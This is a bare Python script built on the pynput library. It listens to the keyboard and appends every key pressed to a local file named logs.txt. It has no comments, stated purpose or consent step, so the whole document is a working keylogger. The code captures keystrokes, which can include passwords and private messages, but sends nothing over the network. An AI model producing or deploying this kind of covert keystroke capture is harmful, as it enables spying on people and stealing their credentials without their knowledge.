from pynput import keyboard
def on_press(key):
    with open('logs.txt','a') as f:
        f.write(str(key))
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()